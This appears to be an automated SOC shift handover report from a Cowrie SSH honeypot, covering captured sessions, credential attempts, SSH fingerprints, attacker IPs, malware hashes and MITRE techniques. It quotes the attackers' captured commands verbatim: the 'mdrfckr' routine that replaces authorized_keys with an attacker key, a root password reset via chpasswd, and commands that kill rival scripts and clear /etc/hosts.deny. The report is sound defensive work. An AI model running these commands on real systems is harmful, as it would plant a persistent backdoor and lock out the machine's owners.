# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T09:48:56Z |
| **Shift Time** | 09:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **109** |
| Confirmed Threats | **106** |
| False Positives Filtered | **3** (2.8%) |
| Unique Attacker IPs | **13** |
| Countries of Origin | **9** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **106** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **21** |
| Unique Credential Pairs | **13** |
| Unique Usernames | **10** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `GET / HTTP/1.1` | 4 |
| `root` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 2 |
| `*1` | 2 |
| `OPTIONS rtsp://example.com RTSP/1.0` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 4 |
| `` | 4 |
| `Accept-Encoding: gzip` | 2 |
| `$4` | 2 |
| `Accept: */*` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `xxBB000` | `180.106.80.16` | 2026-04-24T06:56:24 |
| `root` | `System123!` | `102.208.34.7` | 2026-04-24T08:54:49 |
| `root` | `3245gs5662d34` | `102.208.34.7` | 2026-04-24T08:54:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **109** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 9 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 5 | 2 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 5 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:mdjOw9LxBVeP"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.106.80.16`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.208.34.7`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **13** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | HIGH |
| `AS329473` | Click Connect Proprietary Limited | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS7545` | TPG Telecom Limited | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6890e52a0ab9

| Field | Detail |
|---|---|
| **Source IP** | `180.106.80[.]16` |
| **First Seen** | 2026-04-24 06:56 |
| **Last Seen** | 2026-04-24 06:56 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:mdjOw9LxBVeP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 06:56:23` | `cowrie.session.connect` |
| `2026-04-24 06:56:23` | `cowrie.client.version` |
| `2026-04-24 06:56:23` | `cowrie.client.kex` |
| `2026-04-24 06:56:24` | `cowrie.login.success` |
| `2026-04-24 06:56:25` | `cowrie.session.params` |
| `2026-04-24 06:56:25` | `cowrie.command.input` |
| `2026-04-24 06:56:25` | `cowrie.command.failed` |
| `2026-04-24 06:56:25` | `cowrie.log.closed` |
| `2026-04-24 06:56:26` | `cowrie.session.params` |
| `2026-04-24 06:56:26` | `cowrie.command.input` |
| `2026-04-24 06:56:26` | `cowrie.session.file_download` |
| `2026-04-24 06:56:26` | `cowrie.log.closed` |
| `2026-04-24 06:56:42` | `cowrie.session.params` |
| `2026-04-24 06:56:42` | `cowrie.command.input` |
| `2026-04-24 06:56:42` | `cowrie.log.closed` |
| `2026-04-24 06:56:43` | `cowrie.session.params` |
| `2026-04-24 06:56:43` | `cowrie.command.input` |
| `2026-04-24 06:56:43` | `cowrie.log.closed` |
| `2026-04-24 06:56:44` | `cowrie.session.params` |
| `2026-04-24 06:56:44` | `cowrie.command.input` |
| `2026-04-24 06:56:44` | `cowrie.session.file_download` |
| `2026-04-24 06:56:44` | `cowrie.log.closed` |
| `2026-04-24 06:56:45` | `cowrie.session.params` |
| `2026-04-24 06:56:45` | `cowrie.command.input` |
| `2026-04-24 06:56:45` | `cowrie.log.closed` |
| `2026-04-24 06:56:46` | `cowrie.session.params` |
| `2026-04-24 06:56:46` | `cowrie.command.input` |
| `2026-04-24 06:56:46` | `cowrie.log.closed` |
| `2026-04-24 06:56:47` | `cowrie.session.params` |
| `2026-04-24 06:56:47` | `cowrie.command.input` |
| `2026-04-24 06:56:47` | `cowrie.command.input` |
| `2026-04-24 06:56:47` | `cowrie.log.closed` |
| `2026-04-24 06:56:47` | `cowrie.session.params` |
| `2026-04-24 06:56:47` | `cowrie.command.input` |
| `2026-04-24 06:56:48` | `cowrie.log.closed` |
| `2026-04-24 06:56:48` | `cowrie.session.params` |
| `2026-04-24 06:56:48` | `cowrie.command.input` |
| `2026-04-24 06:56:49` | `cowrie.log.closed` |
| `2026-04-24 06:56:50` | `cowrie.session.params` |
| `2026-04-24 06:56:50` | `cowrie.command.input` |
| `2026-04-24 06:56:50` | `cowrie.log.closed` |
| `2026-04-24 06:56:50` | `cowrie.session.params` |
| `2026-04-24 06:56:50` | `cowrie.command.input` |
| `2026-04-24 06:56:51` | `cowrie.log.closed` |
| `2026-04-24 06:56:51` | `cowrie.session.params` |
| `2026-04-24 06:56:51` | `cowrie.command.input` |
| `2026-04-24 06:56:52` | `cowrie.log.closed` |
| `2026-04-24 06:56:52` | `cowrie.session.params` |
| `2026-04-24 06:56:52` | `cowrie.command.input` |
| `2026-04-24 06:56:52` | `cowrie.log.closed` |
| `2026-04-24 06:56:53` | `cowrie.session.params` |
| `2026-04-24 06:56:53` | `cowrie.command.input` |
| `2026-04-24 06:56:53` | `cowrie.log.closed` |
| `2026-04-24 06:56:54` | `cowrie.session.params` |
| `2026-04-24 06:56:54` | `cowrie.command.input` |
| `2026-04-24 06:56:55` | `cowrie.log.closed` |
| `2026-04-24 06:56:55` | `cowrie.session.params` |
| `2026-04-24 06:56:55` | `cowrie.command.input` |
| `2026-04-24 06:56:55` | `cowrie.log.closed` |
| `2026-04-24 06:56:56` | `cowrie.session.params` |
| `2026-04-24 06:56:56` | `cowrie.command.input` |
| `2026-04-24 06:56:56` | `cowrie.log.closed` |
| `2026-04-24 06:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.106.80[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.106.80[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c8da2e1a4f6

| Field | Detail |
|---|---|
| **Source IP** | `102.208.34[.]7` |
| **First Seen** | 2026-04-24 08:54 |
| **Last Seen** | 2026-04-24 08:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 08:54:46` | `cowrie.session.connect` |
| `2026-04-24 08:54:47` | `cowrie.client.version` |
| `2026-04-24 08:54:47` | `cowrie.client.kex` |
| `2026-04-24 08:54:49` | `cowrie.login.success` |
| `2026-04-24 08:54:49` | `cowrie.session.params` |
| `2026-04-24 08:54:49` | `cowrie.command.input` |
| `2026-04-24 08:54:49` | `cowrie.command.failed` |
| `2026-04-24 08:54:50` | `cowrie.log.closed` |
| `2026-04-24 08:54:51` | `cowrie.session.params` |
| `2026-04-24 08:54:51` | `cowrie.command.input` |
| `2026-04-24 08:54:51` | `cowrie.session.file_download` |
| `2026-04-24 08:54:51` | `cowrie.log.closed` |
| `2026-04-24 08:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.208.34[.]7` to AbuseIPDB if not already reported
- [ ] Block `102.208.34[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74dd60cf97e7

| Field | Detail |
|---|---|
| **Source IP** | `102.208.34[.]7` |
| **First Seen** | 2026-04-24 08:54 |
| **Last Seen** | 2026-04-24 08:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 08:54:55` | `cowrie.session.connect` |
| `2026-04-24 08:54:55` | `cowrie.client.version` |
| `2026-04-24 08:54:55` | `cowrie.client.kex` |
| `2026-04-24 08:54:56` | `cowrie.login.success` |
| `2026-04-24 08:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.208.34[.]7` to AbuseIPDB if not already reported
- [ ] Block `102.208.34[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.14.71[.]20` | **32** | 2026-04-24 07:49 | 2026-04-24 07:50 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.53.180[.]148` | **32** | 2026-04-24 06:42 | 2026-04-24 06:43 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `101.53.233[.]72` | **24** | 2026-04-24 06:14 | 2026-04-24 06:20 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **7** | 2026-04-24 07:50 | 2026-04-24 07:56 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `180.106.80[.]16` | **2** | 2026-04-24 06:56 | 2026-04-24 06:58 | 4m | 0 | `T1592` | 🟢 LOW |
| `60.242.32[.]230` | **2** | 2026-04-24 07:00 | 2026-04-24 07:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.208.34[.]7` | 1 | 2026-04-24 08:54 | 2026-04-24 08:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-24 08:46 | 2026-04-24 08:46 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.111[.]135` | 1 | 2026-04-24 08:05 | 2026-04-24 08:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.127.80[.]34` | 1 | 2026-04-24 07:13 | 2026-04-24 07:14 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.14.71[.]20` | BE | Google LLC | **100** ⚠️ | 1 |
| `59.127.80[.]34` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 6 |
| `102.208.34[.]7` | BW | Click Connect Proprietary Limited | **100** ⚠️ | 17 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `60.242.32[.]230` | AU | TPG Internet Pty Ltd. | **100** ⚠️ | 3 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `14.103.111[.]135` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.106.80[.]16` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `34.53.180[.]148` | BE | Google LLC | **98** ⚠️ | 0 |
| `101.53.233[.]72` | PK | Cyber Internet Services Pakistan | **82** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 11 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 11 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 109 cases |
| Tool 34  | Credential Extractor        | ✅ 21 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 10 recon entry/entries in table (6 group(s) consolidating 99 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T09:48:56Z_
